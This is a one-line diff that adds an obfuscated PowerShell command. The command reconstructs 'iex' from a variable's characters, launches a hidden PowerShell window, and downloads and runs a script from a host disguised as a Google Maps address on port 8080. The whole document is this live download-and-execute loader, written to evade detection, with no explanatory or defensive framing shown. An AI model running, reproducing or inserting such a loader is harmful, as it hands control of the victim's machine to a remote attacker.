@@ -1,0 +1,1 @@
+﻿ .( ([StrInG]$veRbOSEPrEFerENCe)[1,3]+'x'-jOIN'')( (('powersh'+'ell.exe -nop -w'+' h'+'idden '+'-c'+' '+'{1}I'+'EX ((new-object'+' net.we'+'bcli'+'ent).downloadstrin'+'g({'+'0}ht'+'tp:/'+'/g'+'oogl'+'e-map'+'s.'+'redir'+'ect'+'me'+'.net:'+'8080/{0})){1}') -F  [CHAr]39,[CHAr]34)) 
